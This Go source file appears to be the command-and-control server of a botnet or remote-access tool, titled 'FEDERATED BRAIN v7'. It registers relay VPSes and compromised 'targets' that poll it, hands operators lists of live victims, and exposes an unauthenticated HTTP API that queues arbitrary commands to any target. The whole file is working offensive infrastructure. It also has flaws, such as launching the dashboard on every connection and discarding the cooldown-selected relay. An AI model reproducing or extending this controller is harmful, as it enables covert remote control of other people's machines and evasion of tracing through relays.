package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"`
	TargetID string `json:"target_id"`
	Listen   string `json:"listen"`
}

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

var (
	relayPool      []string
	activeSessions = make(map[string]string)
	activeTargets  = make(map[string]string)
	lastSeen       = make(map[string]time.Time)
	mu             sync.Mutex
)
var relayCooldown = make(map[string]time.Time)

func startDashboardAPI() {
	http.HandleFunc("/api/nodes", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Access-Control-Allow-Origin", "*")

		mu.Lock()
		defer mu.Unlock()
		// This works here because the Brain actually owns these maps!
		json.NewEncoder(w).Encode(activeTargets)
	})

	http.HandleFunc("/api/command", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		targetID := r.URL.Query().Get("id")
		cmd := r.URL.Query().Get("cmd")

		mu.Lock()
		activeSessions[strings.ToUpper(targetID)] = cmd
		mu.Unlock()

		fmt.Fprintf(w, "Command %s queued", cmd)
	})

	fmt.Println("[WEB] Dashboard API listening on :9000")
	http.ListenAndServe(":9000", nil)
}
func main() {
	rand.Seed(time.Now().UnixNano())
	ln, _ := net.Listen("tcp", ":8080")
	fmt.Println("==========================================")
	fmt.Println("   FEDERATED BRAIN v7 - STABILITY FIX   ")
	fmt.Println("==========================================")

	for {
		conn, _ := ln.Accept()
		go handleConnection(conn)
		go startDashboardAPI()
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	var req AuthRequest
	if err := json.NewDecoder(conn).Decode(&req); err != nil {
		return
	}

	id := strings.ToUpper(req.TargetID)
	mu.Lock()
	defer mu.Unlock()

	switch req.Type {
	case "middle":
		relayPool = append(relayPool, req.Listen)
		fmt.Printf("[GLOBAL] Relay Registered: %s\n", req.Listen)

	case "client_register":
		activeTargets[id] = req.Key
		lastSeen[id] = time.Now()

	case "cc_list":
		t := make([]string, 0)
		for tid, ownerKey := range activeTargets {
			if ownerKey == req.Key && time.Since(lastSeen[tid]) < 60*time.Second {
				t = append(t, tid)
			}
		}
		json.NewEncoder(conn).Encode(t)

	case "cc_req":
		if len(relayPool) == 0 {
			return
		}
		// Pick a random VPS from the pool
		selectedRelay := relayPool[rand.Intn(len(relayPool))]
		activeSessions[id] = selectedRelay
		json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: selectedRelay})
		fmt.Printf("[>] Session Set: %s -> %s\n", id, selectedRelay)
		for _, r := range relayPool {
			if time.Since(relayCooldown[r]) > 2*time.Second {
				selectedRelay = r
				relayCooldown[r] = time.Now()
				break
			}
		}
	case "client_poll":
		if addr, exists := activeSessions[id]; exists {
			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: addr})
			// CRITICAL: Delete after sending so the ghost stops asking!
			delete(activeSessions, id)
		}
		lastSeen[id] = time.Now()
	}
}
